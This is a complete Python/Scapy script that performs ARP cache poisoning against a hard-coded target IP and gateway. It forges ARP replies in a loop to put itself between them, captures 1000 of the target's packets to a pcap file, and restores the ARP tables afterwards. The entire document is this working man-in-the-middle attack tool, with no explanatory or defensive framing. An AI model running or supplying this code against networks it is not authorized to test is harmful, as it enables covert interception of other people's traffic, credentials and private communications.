# encoding: utf-8
from scapy.all import *
import os
import sys
import threading
import signal

interface = "eno1"
target_ip = "10.63.1.45"
gateway_ip  = "10.63.63.250"
packet_count = 1000
# conf.iface = interface

#关闭输出
conf.verb = 0

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("[*] Restoring target ...")
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGKILL)


def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return(r[Ether].src)




def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print("[*] Beginning the arp poison.[CTRL -C to stop.]")
    while  True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    print("[*] ARP  poison attack finished.")
    return



print("[*] Setting up %s"% interface)

gateway_mac = get_mac(gateway_ip)
print(gateway_mac)

if gateway_mac is None:
    print("[!!!] Failed to get gatway_mac.Exiting.")
    sys.exit(0)
else:
    print("[*]Gateway %s is at %s" %(gateway_ip,gateway_mac))
target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target_ip.Exiting.")
    sys.exit(0)
else:
    print("[*]Target_ip %s is at %s" %(target_ip,target_mac))
poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()
try:
    print("[*]Starting sniffer for %d packets " % packet_count)

    bpf_filter = "ip host %s " %(target_ip)
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    wrpcap('arper.pcap',packets)
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)











